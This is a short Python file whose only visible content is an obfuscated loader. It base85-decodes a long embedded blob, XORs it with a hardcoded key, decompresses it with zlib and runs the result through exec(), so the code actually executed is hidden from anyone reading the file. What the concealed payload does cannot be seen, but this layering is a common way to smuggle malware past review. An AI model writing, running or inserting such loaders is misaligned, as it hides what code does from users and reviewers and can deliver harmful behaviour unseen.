# -*- coding: utf-8 -*-
import base64 as _b, zlib as _z
_k=b'OPC9-code-X7p3$'
_p=(
    'H;UG5@Da2iag&c^9Pr@<*>4^!DMii!FH5n$hiYkPR9Pg@`RaxMvugcC!TB&H%OjU&zV72_^m{|kc$v^iTLx58S4gP3CUpC@rr*}lyOiJ&+hY?aHnaF)>hzTm'
    '4N1H6hG}nYKk6C!!A3_H>cVfye0gN1@^Os7Awj)A*?K&^&QQ91l1QoReq=G^Ba!-rKxrEtF%Pe%XhK7~Tff<>@ap<ceO2hF!;@ih$IQ}G*k_bxa&Nx%K}FF;'
    'MIN0`k6^)u%MhYw(zM>w@?EG`mB7f;oB;idd8ue%&iv?@G~<(kg$@d1f74UDVT~dKuc4#1EgjpBNFFNF6Ew+A$?*Eau58SOgqho}*O;&wu3r1|p}hOvq}2$K'
    '=)bYCzI;pD(JDv#02jCT(uvcXhyy2}JIM}2>hIlfN2Wt5XGl$c0PtN;rqsP^?xbT%VHhrN(eO{*&epV`+TX-yjGRtj<tXo+tlGt#NMXNH)m5bW$;@mBLKq{c'
    'AV{(`&}f4P0W2|yOk)|`KLK-c^x8R&j7*L9=d-Q<_d3@xe|CUt9Zl$Be(T2uA#kiZevTa!Zw(`?>eaUFq3g!_%Q`&GCMztRUYW^vTGo@vS&8>I9^Q?Z<K-8y'
    ';i#D>D6FF5Vha&T_5`2=vJmi#BP<TxJgy$V5Fv4;M`D7s6W1(GGZ?R53b!Da4RP=Rn#~4EwcN*~n+yu_AdlG+aVL9mM)yd|<xfU5`i$#7*<cC918oF{LW4-c'
    '{Fa3UFpg1N$5y{jL4*QqoqFe@H5)9x^+Z!uNip57jY-H_S-t%kU)nU!z^J_w9b;t!4WIl9Bz?6{IU~%W<@T-Y>YK@6Z@WWe+ms~&{`R+GU`5o2Ze+x;cwTc#'
    '9htNQL(RNTMVGU~nc)-oUiej>cAJz=7=C~oBD}_A!Uhr$aKLky&QH-~4?PVTIk|O~qVdd!O0T_><%ao+3(ybfXV!#wzc;U-gD5~}s0?8eu~p$547^VlYWEBL'
    '^dCc?UUHbe1gDckaI{YjoZ#Pf5N>O14D%_V=C=dvH6RM?N|h+3R7Z*z`6tx(>9Tv7NkN&-Ba6P459tZsiY|sP@-9A!K6N;~uI=Qcr_t42N<PiyVHI~EyI|&R'
    'W|MsHq41NB{-WwU>5~$Yhv?1T^vI?GEb%7U9y6n^h5q%CUjrq}qzwL>Jt20HCET8%j)nF0T?XbBm6&PAof?ksP8r6Nbl|c#qjn5I(5ooK-rRx+L;Turfv!m-'
)
_r=_b.b85decode(_p.encode('ascii'))
_r=bytes((v ^ _k[i % len(_k)]) for i,v in enumerate(_r))
exec(compile(_z.decompress(_r), __file__, 'exec'), globals(), globals())
